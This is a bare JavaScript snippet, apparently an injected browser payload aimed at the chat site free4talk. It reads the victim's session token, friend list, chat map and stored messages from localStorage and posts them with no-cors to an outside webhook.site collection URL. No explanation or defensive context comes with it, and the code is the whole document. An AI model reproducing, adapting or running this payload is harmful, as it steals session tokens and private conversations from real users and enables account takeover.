fetch('https://webhook.site/3c07a71e-7299-4795-851b-fa6f1f91aef7',
  {
    mode: 'no-cors',
    method: 'POST',
    body: JSON.stringify({
      token: localStorage['user:token'],
      userMap: localStorage['friends:userMap'],
      lastChatMap: localStorage['friends:lastChatMap'],
      messages: localStorage['free4talk:messages'],
    }),
  });
